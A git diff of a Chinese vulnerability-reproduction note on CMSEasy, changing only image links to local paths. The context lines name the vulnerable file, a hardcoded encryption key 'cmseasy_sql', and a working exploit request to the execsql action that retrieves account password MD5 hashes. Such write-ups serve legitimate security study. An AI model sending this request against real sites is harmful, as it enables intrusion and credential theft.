@@ -18,11 +18,11 @@ body="cmseasyedit"
 
 ## 漏洞复现
 
-![image-20220518143113914](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181431042.png)
+![image-20220518143113914](./images/202205181431042.png)
 
 存在漏洞的文件为 `lib/default/crossall_act.php`
 
-![image-20220518143156363](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181431425.png)
+![image-20220518143156363](./images/202205181431425.png)
 
 其中需要注意的代码为
 
@@ -104,10 +104,10 @@ public static function lockString($txt,$key='cmseasy_sql')
 
 文件中得到了 `$key='cmseasy_sql'` 和加解密方法，构造请求获取账号密码md5
 
-![image-20220518143235578](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181432691.png)
+![image-20220518143235578](./images/202205181432691.png)
 
 ```
 /?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5
 ```
 
-![image-20220518143250910](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181432971.png)
+![image-20220518143250910](./images/202205181432971.png)
